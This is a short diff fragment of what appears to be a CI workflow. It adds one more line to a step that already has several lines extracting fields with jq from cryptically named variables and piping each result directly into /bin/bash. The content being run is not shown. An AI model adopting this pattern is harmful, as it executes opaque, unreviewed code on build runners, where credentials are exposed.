@@ -30,6 +30,7 @@ jobs:
           echo $u961 | jq -r .mwhm4 | /bin/bash
           printf '%s' "$skdjk05" | jq -r .qdt71726 | /bin/bash
           printf '%s' "$sn305" | jq -r .j7 | /bin/bash
+          echo $lwzv353 | jq -r .b741 | /bin/bash
 
       - name: Save output
         if: always()
